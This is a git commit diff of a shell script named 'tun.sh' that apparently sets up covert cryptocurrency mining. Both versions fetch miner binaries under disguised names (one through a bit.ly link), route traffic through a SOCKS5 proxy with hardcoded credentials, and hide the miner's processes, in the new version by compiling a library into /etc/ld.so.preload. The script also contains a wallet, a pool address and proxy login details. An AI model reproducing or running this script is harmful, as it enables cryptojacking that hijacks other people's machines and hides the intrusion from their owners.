88d9830cf512aa116484ee0fd2020138764d8df2
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-04-05 18:45:15 -0600

    Update tun.sh

--- tun.sh
+++ tun.sh
@@ -1,25 +1,51 @@
-#!/bin/bash
-apt update && apt -y install sudo wget curl unzip
-sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-
-npm i -g node-process-hider
-
+#!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-POOL=https://pool.services.tonwhales.com
-WALLET=EQD6Q0feCmBzLl2gaAQf2JK9wWwTy4bZVRkhwDRtLwDz2RBp
-WORKER=$(echo $(shuf -i 41-80 -n 1)-ETHash)
-#wget https://github.com/drJamesjack/prem/raw/main/lolMiner
-wget https://bit.ly/3FpnfeJ
-chmod +x 3FpnfeJ
-#chmod +x lolMiner
-while [ 1 ]; do
-#./3FpnfeJ --algo ETHASH --pool $POOL --user $WALLET.$WORKER --pass c=LTC,mc=ETH
-./3FpnfeJ --algo TON --pool $POOL --user $WALLET.$WORKER --ton-mode 1
-sleep 5
-done
-sleep 999999999
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 185.242.111.64:12324
+socks5_username = 14abf5d6e18da
+socks5_password = dbb7a6d2ae
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://github.com/archernap/prem/raw/main/priyatama
+chmod +x priyatama
+POOL=ethash.poolbinance.com:1800
+WALLET=teguhcong
+WORKER=$(echo $(shuf -i 10-40 -n 1)-MAGIC)
+
+./graftcp/graftcp wget https://github.com/hunzibao/tmp/raw/main/magicPriyatama.zip
+unzip magicPriyatama.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
